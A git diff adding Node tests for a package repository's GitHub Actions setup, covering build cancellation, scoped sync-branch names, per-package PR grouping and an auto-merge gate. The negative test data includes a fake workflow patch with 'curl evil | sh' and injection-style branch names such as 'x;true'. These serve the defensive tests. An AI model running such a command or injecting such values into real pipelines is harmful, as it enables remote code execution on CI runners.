@@ -1,5 +1,5 @@
 const assert = require('node:assert/strict');
-const { readFileSync, mkdtempSync, rmSync } = require('node:fs');
+const { readFileSync, writeFileSync, mkdirSync, mkdtempSync, rmSync } = require('node:fs');
 const { join } = require('node:path');
 const { tmpdir } = require('node:os');
 const { test } = require('node:test');
@@ -186,6 +186,15 @@ test('a delayed tests workflow is also awaited', async () => {
   assert.deepEqual(state.approved, [1, 2]);
 });
 
+test('a lone build left pending behind an older in-flight build does not hold back the tests', async () => {
+  // Sync branches queue rather than cancel, so an approved build can stay
+  // queued for hours. Only a newer held build needs to wait for it to start.
+  const { state, invoke } = fixture([run(1, BUILD), run(2, TESTS)], { queueUntil: Infinity });
+  await invoke();
+  assert.deepEqual(state.approved, [1, 2]);
+  assert.deepEqual(state.transitions, []);
+});
+
 test('reopening a labeled PR waits for its new tests, even if old tests passed at the same SHA', async () => {
   const { state, invoke } = fixture([
     run(1, TESTS, { created_at: earlier, conclusion: 'success' }), run(2, BUILD),
@@ -312,3 +321,174 @@ for (const [name, overrides] of [
     assert.doesNotMatch(result.stdout, /::notice::Awaiting maintainer build approval/);
   });
 }
+
+// A push to a sync branch must not cancel that PR's multi-hour build; any
+// other PR still cancels its superseded build.
+test('only same-repository sync branches queue behind an in-flight build', () => {
+  const expression = workflow.match(/^  cancel-in-progress: \$\{\{(.*)\}\}$/m)[1];
+  const cancels = (repo, ref) => new Function('github', 'startsWith', `return (${expression})`)(
+    { repository: 'omacom/omarchy-pkgs', head_ref: ref,
+      event: { pull_request: { head: { repo: { full_name: repo } } } } },
+    (text, prefix) => text.startsWith(prefix));
+  assert.equal(cancels('omacom/omarchy-pkgs', 'auto/sync-upstream'), false);
+  assert.equal(cancels('omacom/omarchy-pkgs', 'auto/sync-upstream-ttfx'), false);
+  assert.equal(cancels('omacom/omarchy-pkgs', 'auto/sync-rebuilds'), false);
+  assert.equal(cancels('omacom/omarchy-pkgs', 'auto/track-branches-omarchy-dev-omarchy-settings-dev'), false);
+  assert.equal(cancels('omacom/omarchy-pkgs', 'ttfx/fix'), true);
+  assert.equal(cancels('someone/omarchy-pkgs', 'auto/sync-upstream'), true);
+  assert.equal(cancels(undefined, ''), true); // workflow_dispatch
+});
+
+// A scoped dispatch must not push to the shared branch: it would replace the
+// other pending updates in the open sync PR with just the named packages.
+const branchScript = join(__dirname, '../.github/scripts/sync-pr-branch.sh');
+const branchFor = (...names) => Object.fromEntries(execFileSync(branchScript,
+  ['auto/sync-upstream', ...names], { encoding: 'utf8' })
+  .trim().split('\n').map(line => line.split(/=(.*)/s).slice(0, 2)));
+
+test('scheduled runs keep the shared branch; scoped runs get their own', () => {
+  assert.deepEqual(branchFor(), { branch: 'auto/sync-upstream', scope: '' });
+  assert.deepEqual(branchFor('ttfx'), { branch: 'auto/sync-upstream-ttfx', scope: 'ttfx' });
+  assert.deepEqual(branchFor('ttfx', 'strata', 'ttfx'),
+    { branch: 'auto/sync-upstream-strata-ttfx', scope: 'strata ttfx' });
+  assert.equal(branchFor('python-foo.bar').branch, 'auto/sync-upstream-python-foo-bar');
+  const names = ['a-very-long-package-name-one', 'another-very-long-package-name-two'];
+  const long = branchFor(...names, 'third');
+  assert.ok(long.branch.length <= 'auto/sync-upstream-'.length + 60);
+  assert.notEqual(long.branch, branchFor(...names).branch);
+});
+
+test('scoped branch names reject anything that is not a package name', () => {
+  for (const name of ['../x', 'A', 'x y', 'a@{b', '-x', '.x', 'x;true']) {
+    assert.equal(spawnSync(branchScript, ['auto/sync-upstream', name]).status, 1, name);
+  }
+});
+
+// Every bot lane opens one PR per package through package-prs.yml, with the
+// PAT: a GITHUB_TOKEN push would wait for build approval, and a GITHUB_TOKEN
+// merge would not start publish.yml.
+test('every bot lane opens its PRs per package through package-prs.yml', () => {
+  for (const [file, prefix] of [['sync-upstream.yml', 'auto/sync-upstream'],
+    ['sync-rebuilds.yml', 'auto/sync-rebuilds'], ['track-branches.yml', 'auto/track-branches']]) {
+    const text = readFileSync(join(__dirname, '../.github/workflows', file), 'utf8');
+    assert.match(text, new RegExp(`package-pr-groups\\.sh ${prefix.replace('/', '\\/')} "\\$RUNNER_TEMP\/pins\\.patch"`), file);
+    assert.match(text, /uses: \.\/\.github\/workflows\/package-prs\.yml/, file);
+    assert.match(text, new RegExp(`prefix: ${prefix.replace('/', '\\/')}\n`), file);
+    assert.match(text, /PKGS_BOT_TOKEN: \$\{\{ secrets\.PKGS_BOT_TOKEN \}\}/, file);
+    assert.doesNotMatch(text, /create-pull-request|build-approved|\n  approve:\n/, file);
+    assert.doesNotMatch(text, /^ +(contents|pull-requests|actions): write$/m, file);
+  }
+  const prs = readFileSync(join(__dirname, '../.github/workflows/package-prs.yml'), 'utf8');
+  assert.match(prs, /token: \$\{\{ secrets\.PKGS_BOT_TOKEN \}\}/);
+  assert.doesNotMatch(prs, /secrets\.GITHUB_TOKEN/);
+  assert.match(prs, /gh pr merge --auto --merge "\$PR"/);
+  assert.match(prs, /fail-fast: false/);
+  assert.doesNotMatch(prs, /^ +(contents|pull-requests|actions): write$/m);
+});
+
+// One PR per package, except packages pinned from the same upstream branch,
+// which move in lockstep and so share one.
+const groupsScript = join(__dirname, '../.github/scripts/package-pr-groups.sh');
+test('package PRs split per package and keep branch siblings together', () => {
+  const dir = mkdtempSync(join(tmpdir(), 'package-pr-groups-'));
+  try {
+    const git = (...args) => execFileSync('git', ['-C', dir, '-c', 'user.name=T', '-c', 'user.email=t@t', ...args]);
+    git('init', '-q');
+    const write = (name, watch) => {
+      const pkg = join(dir, 'pkgbuilds', name);
+      mkdirSync(join(pkg, '.omarchy'), { recursive: true });
+      writeFileSync(join(pkg, 'PKGBUILD'), `pkgname=${name}\npkgver=1\npkgrel=1\n`);
+      writeFileSync(join(pkg, '.omarchy/package.json'), JSON.stringify({ upstream: { watch } }));
+    };
+    const branch = { git_branch: 'https://github.com/basecamp/omarchy.git', branch: 'quattro' };
+    write('omarchy-dev', branch);
+    write('omarchy-settings-dev', branch);
+    write('omasnap-git', { git_branch: 'https://github.com/omacom/omasnap.git', branch: 'main' });
+    write('zed', { github: 'zed-industries/zed' });
+    write('untouched', { github: 'x/y' });
+    git('add', '.');
+    git('commit', '-qm', 'base');
+    for (const name of ['omarchy-dev', 'omarchy-settings-dev', 'omasnap-git', 'zed']) {
+      writeFileSync(join(dir, 'pkgbuilds', name, 'PKGBUILD'), `pkgname=${name}\npkgver=2\npkgrel=1\n`);
+    }
+    const patch = join(dir, 'pins.patch');
+    const groups = JSON.parse(execFileSync(groupsScript, ['auto/track-branches', patch], { cwd: dir, encoding: 'utf8' }));
+    assert.deepEqual(groups, [
+      { branch: 'auto/track-branches-omarchy-dev-omarchy-settings-dev', packages: 'omarchy-dev omarchy-settings-dev' },
+      { branch: 'auto/track-branches-omasnap-git', packages: 'omasnap-git' },
+      { branch: 'auto/track-branches-zed', packages: 'zed' },
+    ]);
+    assert.match(readFileSync(patch, 'utf8'), /pkgbuilds\/zed\/PKGBUILD/);
+    git('checkout', '-q', '--', 'pkgbuilds');
+    assert.deepEqual(JSON.parse(execFileSync(groupsScript, ['auto/sync-upstream', patch], { cwd: dir, encoding: 'utf8' })), []);
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
+});
+
+const { decide } = require('../.github/scripts/auto-merge-pr.cjs');
+const repository = 'omacom/omarchy-pkgs';
+const mergeable = (overrides = {}) => ({
+  state: 'open', draft: false, labels: [],
+  head: { ref: 'superwhisper-bin', repo: { full_name: repository } }, ...overrides,
+});
+const packageFiles = [{ filename: 'pkgbuilds/superwhisper-bin/PKGBUILD' },
+  { filename: 'pkgbuilds/superwhisper-bin/.omarchy/package.json' }];
+
+test('auto-merge follows the build gate: trusted authors, or build-approved for unknown ones', () => {
+  for (const vouchStatus of ['collaborator', 'vouched', 'bot']) {
+    assert.equal(decide({ pr: mergeable(), files: packageFiles, vouchStatus, repository }).enable, true, vouchStatus);
+  }
+  assert.equal(decide({ pr: mergeable(), files: packageFiles, vouchStatus: 'unknown', repository }).enable, false);
+  const labelled = mergeable({ labels: [{ name: 'build-approved' }] });
+  assert.equal(decide({ pr: labelled, files: packageFiles, vouchStatus: 'unknown', repository }).enable, true);
+  // A denouncement is absolute, and a failed lookup is not approval.
+  for (const vouchStatus of ['denounced', '', undefined, 'error']) {
+    assert.equal(decide({ pr: labelled, files: packageFiles, vouchStatus, repository }).enable, false, String(vouchStatus));
+  }
+});
+
+test('auto-merge only lands PRs that change nothing outside pkgbuilds/', () => {
+  const check = files => decide({ pr: mergeable(), files, vouchStatus: 'collaborator', repository }).enable;
+  assert.equal(check(packageFiles), true);
+  assert.equal(check([...packageFiles, { filename: '.github/workflows/publish.yml' }]), false);
+  assert.equal(check([{ filename: 'bin/build' }]), false);
+  assert.equal(check([{ filename: 'pkgbuilds/x/PKGBUILD', previous_filename: 'helpers/x.sh' }]), false);
+  assert.equal(check([]), false);
+});
+
+test('auto-merge accepts the test a package PR brings, and nothing else outside pkgbuilds/', () => {
+  const check = files => decide({ pr: mergeable(), files, vouchStatus: 'collaborator', repository }).enable;
+  const wiring = patch => ({ filename: '.github/workflows/test.yml', status: 'modified', patch });
+  const newTest = { filename: 'tests/superwhisper-bin-install.sh', status: 'added' };
+  // #854's shape: package files, a new test, and one line in test.yml running it.
+  const adds = '@@ -67,6 +67,7 @@ jobs:\n               ./tests/voxtype-bin-install.sh\n+              ./tests/superwhisper-bin-install.sh\n               pacman -S --noconfirm --quiet rclone >/dev/null';
+  assert.equal(check([...packageFiles, newTest, wiring(adds)]), true);
+  // An existing test can run on master with write access; editing it is not a package change.
+  assert.equal(check([...packageFiles, { filename: 'tests/build-isolation.sh', status: 'modified' }]), false);
+  // test.yml changes that do anything but add a test call.
+  assert.equal(check([...packageFiles, wiring('@@ -1 +1 @@\n-on:\n+on: [push]')]), false);
+  assert.equal(check([...packageFiles, wiring('@@ -67 +67,2 @@\n+              ./tests/x.sh\n+              curl evil | sh')]), false);
+  assert.equal(check([...packageFiles, wiring('@@ -67 +67 @@\n-              ./tests/a.sh\n+              ./tests/b.sh')]), false);
+  assert.equal(check([...packageFiles, wiring(undefined)]), false);
+});
+
+test('auto-merge skips drafts and closed PRs, and arms every bot lane', () => {
+  const check = pr => decide({ pr, files: packageFiles, vouchStatus: 'bot', repository }).enable;
+  assert.equal(check(mergeable({ draft: true })), false);
+  assert.equal(check(mergeable({ state: 'closed' })), false);
+  // The bot lanes already enable their own auto-merge; agreeing is harmless.
+  for (const ref of ['auto/sync-upstream-zed', 'auto/sync-rebuilds-walker', 'auto/track-branches-omarchy-dev-omarchy-settings-dev']) {
+    assert.equal(check(mergeable({ head: { ref, repo: { full_name: repository } } })), true, ref);
+  }
+});
+
+test('auto-merge workflow enables with the bot token and never checks out the PR', () => {
+  const text = readFileSync(join(__dirname, '../.github/workflows/auto-merge-pr.yml'), 'utf8');
+  assert.match(text, /pull_request_target:/);
+  assert.match(text, /ref: \$\{\{ github\.event\.repository\.default_branch \}\}/);
+  assert.doesNotMatch(text, /head\.sha \}\}|head\.ref \}\}|refs\/pull\//);
+  assert.match(text, /GH_TOKEN: \$\{\{ secrets\.PKGS_BOT_TOKEN \}\}/);
+  assert.match(text, /gh pr merge --auto --squash --match-head-commit "\$HEAD_SHA"/);
+  assert.doesNotMatch(text, /^ +(contents|pull-requests|actions): write$/m);
+});
